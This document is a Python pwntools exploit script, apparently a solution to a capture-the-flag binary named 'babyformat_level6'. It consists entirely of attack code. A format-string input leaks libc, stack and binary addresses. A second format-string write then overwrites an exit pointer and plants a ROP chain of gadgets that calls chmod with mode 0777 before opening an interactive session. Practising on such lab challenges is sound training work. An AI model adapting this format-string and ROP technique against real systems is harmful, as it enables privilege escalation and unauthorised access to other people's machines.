
from pwn import *
from os import system

exe = context.binary = ELF(args.EXE or '/challenge/babyformat_level6')
context.terminal = ["tmux", "splitw", "-h"]

def start(argv=[], *a, **kw):
    '''Start the payload1 against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
tbreak main
continue
'''.format(**locals())

io = start()

payload1 = f"%3$lx %170$p %171$p"
payload = payload1.encode()  
io.recvuntil(b'read your input again.')
io.sendline(payload)

io.recvuntil(b"Your input is:")
io.recvline()
leak_bytes = io.recvline(keepends=False)
leak = leak_bytes.decode().split(' ')
leaked_libc_func_int = int(leak[0], 16)
base = leaked_libc_func_int - 0x10e077
leaked_rbp = leak[1]
main_rbp = int(leaked_rbp, 16)
func_rbp = main_rbp - 80 
rip_func_addr = func_rbp + 8
rsp_func=func_rbp-1312 
leaked_current_instruction = int(leak[2], 16)
leaked_binary_base =leaked_current_instruction - 5611
pop_rdi = 0x23b6a 
pop_rsi = 0x2601f 
pop_rdx = 0x142c92 
pop_rax = 0x36174  
syscall = 0x2284d  

exit_address = leaked_binary_base + 0x4060
new_rsp =  rip_func_addr

payload2 = b"A"*2 + fmtstr_payload(43, {
    exit_address : p64(base + 0x578c8).ljust(8, b"\x00"),
    new_rsp : p64(base + pop_rdi).ljust(8, b"\x00"),
    new_rsp + 8 : p64(base + 0x1eb1f3).ljust(8, b"\x00"),
    new_rsp + 16 : p64(base + pop_rsi).ljust(8, b"\x00"),
    new_rsp + 24 : p64(0o777),
    new_rsp + 32 : p64(base + pop_rdx).ljust(8, b"\x00"),
    new_rsp + 40 : p64(0),
    new_rsp + 48 : p64(base + pop_rax).ljust(8, b"\x00"),
    new_rsp + 56 : p64(0x5a),
    new_rsp + 64 : p64(base + 0x2284d).ljust(8, b"\x00")
    }, numbwritten=40,  write_size='short', strategy='fast')

io.sendline(payload2)
print(io.recv())
io.interactive()

